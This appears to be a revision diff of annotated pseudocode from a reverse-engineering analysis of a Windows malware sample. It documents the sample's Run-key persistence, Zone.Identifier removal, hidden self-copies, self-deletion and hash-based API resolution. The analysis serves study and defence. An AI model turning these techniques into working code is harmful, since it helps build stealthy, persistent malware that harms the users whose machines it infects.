@@ -1,5 +1,5 @@
 // The program starts with a Visual Studio C Runtime Initialisation function _tmainCRTStartup
-// https://github.com/cansou/msvcrt/blob/master/src/crt0.c#L169 from VS Code 2008 is almost identical to ghidra decompilation and assembly
+// https://github.com/cansou/msvcrt/blob/master/src/crt0.c#L169 (Microsoft, 2008) crt0.c from VS Code 2008 is almost identical to ghidra decompilation and assembly
 // with Ghidra identifying its functions from Visual Studio 2010
  _tmainCRTStartup:
     GetStartupInfoW((LPSTARTUPINFOW)&startupInfo);
@@ -45,7 +45,7 @@ wWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCm
     GetVersionExW(&lpVersionInformation)
 
     //Get desktop localisation names from Shell32 
-    //https://superuser.com/questions/1226104/list-all-possible-localization-names-in-shell32-dll-or-any-other-dll-with-this
+    //https://superuser.com/questions/1226104/list-all-possible-localization-names-in-shell32-dll-or-any-other-dll-with-this (laserflor, 2021)
     shell32Handle = LoadLibraryW(L"Shell32.dll")
     LoadStringW((HINSTANCE)shell32Handle,0x5509,(LPWSTR)&Desktop,0xff)         /*Desktop*/
     LoadStringW((HINSTANCE)shell32Handle,0x5527,(LPWSTR)&Public_Desktop,0xff)  /*Public Desktop*/
@@ -79,7 +79,7 @@ wWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCm
     GetModuleFileNameW(0x0,&selfPath,0x1000)
 
     //Delete the "Zone.Identifier" from the executable that would say whether the file was downloaded from the internet
-    //https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/6e3f7352-d11c-4d76-8c39-2516a9df36e8?redirectedfrom=MSDN
+    //https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/6e3f7352-d11c-4d76-8c39-2516a9df36e8?redirectedfrom=MSDN (Microsoft, 2023)
     _wcscpy_s(&selfZoneIdentifier,0x1000,&selfPath)             /*%APPDATA%/MSUpdate.exe*/
     _wcscat_s(&selfZoneIdentifier,0x1000,L":Zone.Identifier")   /*%APPDATA%/MSUpdate.exe:Zone.Identifier*/
     DeleteFileW(&selfZoneIdentifier)
@@ -88,8 +88,8 @@ wWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCm
     exeChecksum = getExeChecksum()
 
     //Checks if process is run as administrator and stores value as a global variable
+    //https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-checktokenmembership (Microsoft, 2021b)
 
-    //https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-checktokenmembership
     /*++ 
     Routine Description: This routine returns TRUE if the caller's
     process is a member of the Administrators local group. Caller is NOT
@@ -126,19 +126,21 @@ wWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCm
         enablePrivilege(&NTAuthority);
 
     //Create a new process with a random name if there is no file of the same name in \Documents or \Windows depending on whether the process is running as admin
-    retCode = getSelfIntegrityLevel(&AdministratorsGroup)
+    retCode = getSelfIntegrityLevel(&IntegrityLevel)
     if retCode==0:
         retCode= createNewProcess()
         if retCode!= 0: return 1
     else:
-        if AdministratorsGroup == SECURITY_MANDATORY_MEDIUM_RID /*0x2000*/
-            || AdministratorsGroup == SECURITY_MANDATORY_HIGH_RID /*0x3000*/
-                || AdministratorsGroup == SECURITY_MANDATORY_SYSTEM_RID /*0x4000*/:
+        if IntegrityLevel == SECURITY_MANDATORY_MEDIUM_RID /*0x2000*/
+            || IntegrityLevel == SECURITY_MANDATORY_HIGH_RID /*0x3000*/
+                || IntegrityLevel == SECURITY_MANDATORY_SYSTEM_RID /*0x4000*/:
             retCode = createNewProcess()
             if retCode!=0: return 1
 
-        //Start a new process without making a new file using the command line and exit
-        else if AdministratorsGroup < 0x2001:
+        // Start a new process using the same executable using runas
+        // to make the new integrity level >=0x2000
+        // then exit
+        else if IntegrityLevel < 0x2001:
             runWithCmd()
             return 1
     
@@ -166,7 +168,7 @@ addToStartup():
     //Create command to run current process again
     _wcscpy_s(command, 0x104, L"/c start \"\" \"")  /* /c start "" " */
     _wcscat_s(command, 0x104, &selfPath)            /* /c start "" "*selfPath* */
-    _wcscpy_s(command, 0x104, L"\"")                /* /c start "" "**selfPath" */
+    _wcscpy_s(command, 0x104, L"\"")                /* /c start "" "*selfPath*" */
     RegCreateKeyExW = findFunc(0x0, 2, 0x90a097f0) //find RegCreateKeyExW using hash 0x90a097f0 from dll 'advapi32.dll'
 
     //Get keyHandle of startup location 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
@@ -188,8 +190,8 @@ addToStartup():
     RegCloseKey = findFunc(0x0, 2, 0xdb355534) //find RegCloseKey using hash 0xeb355534 from dll 'advapi32.dll'
     RegCloseKey(keyHandle)
 
-    //Attempt to add/change the value of 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLinkedConnections' to 1
-    //https://learn.microsoft.com/en-us/troubleshoot/windows-client/networking/mapped-drives-not-available-from-elevated-command
+    //Attempt to add/change the value of 'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLinkedConnections' to 1
+    //https://learn.microsoft.com/en-us/troubleshoot/windows-client/networking/mapped-drives-not-available-from-elevated-command (Microsoft, 2021c)
     //"EnableLinkedConnections registry entry forces the symbolic links to be written to both linked logon sessions that are created, when UAC is enabled."
     //This would allow the program to read from symbolic links if it was in an elevated command prompt
     RegCreateKeyExA(HKEY_LOCAL_MACHINE /*0x80000002*/,
@@ -274,11 +276,12 @@ createNewProcess():
             //Make new executable hidden
             SetFileAttributesW(&exePath, FILE_ATTRIBUTE_HIDDEN /*0x2*/)
             STARTUPINFO startupInfo;
+            PROCESS_INFORMATION processInfo;
             _memset(&startupInfo, 0x00, 0x44)
             startupInfo.wShowWindow = TRUE
             startupInfo.dwFlags = STARTF_USESHOWWINDOW /*0x1*/
             startupInfo.cb = 0x44
-            createProcRet = CreateProcessW(0x0,&exePath,0x0, 0x0, 0, 0x20, 0x0, 0x0, &startupInfo,(LPPROCESS_INFORMATION)&local_4264)
+            createProcRet = CreateProcessW(NULL, &exePath, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS /*0x20*/, NULL, NULL, &startupInfo, &processInfo)
         
         //Delete the current executable file
         deleteSelf()
@@ -295,7 +298,7 @@ deleteSelf():
     if retVal == 0:
         return 0
     
-    //https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file#short-vs-long-names
+    //https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file#short-vs-long-names (Microsoft, 2022)
     //Get the MS-DOS compatible short path name 
     retVal = GetShortPathNameW(&selfPath, &selfPath, 0x1000)
     if retVal == 0:
@@ -448,7 +451,8 @@ findFuncFromDllAddr(void* dllAddr, int funcId):
     //If the funcID is < 4 bytes long use it as the function ordinal
     //This is for forwards that have the function ordinal rather than the function name
     if funcID >> 0x10 == 0:
-        //https://ferreirasc.github.io/PE-Export-Address-Table/
+        //Subtract function ordial from base to get offset ordinal
+        //https://ferreirasc.github.io/PE-Export-Address-Table/ (ferreirasc, 2022)
         //IMAGE_EXPORT_DIRECTORY+0x10 = Base
         funcOrdinal = (funcId & 0xffff) - ExportDir->Base
     else:
@@ -489,7 +493,7 @@ findFuncFromDllAddr(void* dllAddr, int funcId):
     funcAddr = dllAddr + *(dllAddr + funcRVA)
 
     //If the function address is within the Export Directory size then it is a forward and must be resolved to find the actual function address
-    //https://ferreirasc.github.io/PE-Export-Address-Table/
+    //https://ferreirasc.github.io/PE-Export-Address-Table/ (ferreirasc, 2022)
     if (ExportDir < funcAddr) && (funcAddr - exportDir < ExportTableSize):
         funcAddr = resolveForwards((funcAddr- exportDir), funcOrdinal, funcAddr)
     return funcAddr
@@ -531,8 +535,8 @@ resolveForwards(int exportOffset, int ordinal, char* forwardName):
         charIndx3+=1
     
     //If the forwared function name starts with '#' then store integer value of the function ordinal rather than the function hash
-    //https://reverseengineering.stackexchange.com/a/16024
-    //http://www.pelib.com/resources/luevel.txt
+    //https://reverseengineering.stackexchange.com/a/16024 (Porst, 1999)
+    //http://www.pelib.com/resources/luevel.txt (Porst, 1999)
     if forwardName[charIndx+1] == "#":
         funcID = stringToInt(&forwardName[charIndx+2])
     else:
@@ -665,7 +669,7 @@ getSelfIntegrityLevel(DWORD *cb):
         goto End
     
     //Store the TOKEN_MANDATORY_LABEL.Sid->SubAuthority (aka the manditory integrity level value) from *TokenIntegrityLevel* in the callback address
-    *cb = getSelfIntegrityLevel(TokenInformation, 0)
+    *cb = GetSidSubAuthority(TokenInformation, 0)
 
     End:
     if TokenHandle != 0:
@@ -745,8 +749,8 @@ void* funcAddrsPtr
 funcAddrs = [call0x1c180, callGenRandom, resetVars, func0x1c180]
 doSomeRegediting():
     keyHandle = 0
-    //This will return ERROR_BAD_PATHNAME *0xA1 (161)* As:
-    //https://asmsource1.tripod.com/proccalls/proc-RegCreateKeyEx.htm
+    //This will return ERROR_BAD_PATHNAME *0xA1 (161)* if not windows 95/98:
+    //https://asmsource1.tripod.com/proccalls/proc-RegCreateKeyEx.htm (Microsoft, 2005)
     //Windows NT/2000: The subkey name specified by lpSubKey must not begin with the backslash character ('\'). If it does, ERROR_BAD_PATHNAME is returned.
     //Windows 95/98: Beginning backslash characters in the subkey name specified by lpSubKey are ignored.
     retVal = RegCreateKeyExW(HKEY_USERS /*0x80000003*/, L"\\S-1-5-18\\Software\\xxxsys\\", 0, NULL,
@@ -834,12 +838,12 @@ func0x1c180(_STAT_WORKSTATION_0* netStats, int int1 , double double1):
         if int1>0x14:
             int1Store = 0x14
         cbVar = 0
-        func0x1b160("@", &cbVar)
+        func0x1b160(funcArr, &cbVar)
 
-func0x1b160(char* @, char** stringArr):
+func0x1b160(void* funcArr, char** stringArr):
     stringArr[2] = stringArr[2] & 0xfffffffd
     string1 = stringArr[0]
-    if string1 != &@:
+    if string1 != &funcArr:
         if string1 != 0x00 && string1[0x44] != 0x00:
             string3 = stringArr[3]
             if [0x480188] != 0x00:
@@ -847,13 +851,13 @@ func0x1b160(char* @, char** stringArr):
             _free(string3)
             if [0x480188] != 0x00:
                 [0x480188](0,1)
-        stringArr[0] = &@
-        if (stringArr[2] & 0x100) == 0 && @[0x44] != 0x00:
-            stringArr[5] = @[0x14]
-            if @[0x44] < 1:
+        stringArr[0] = &funcArr
+        if (stringArr[2] & 0x100) == 0 && funcArr[0x44] != 0x00:
+            stringArr[5] = funcArr[0x14]
+            if funcArr[0x44] < 1:
                 mallocAddr = 0x00
             else:
-                mallocAddr = func0x230b0(@[0x44])
+                mallocAddr = func0x230b0(funcArr[0x44])
             stringArr[3] = mallocAddr
             if mallocAddr == 0x00:
                 return 0
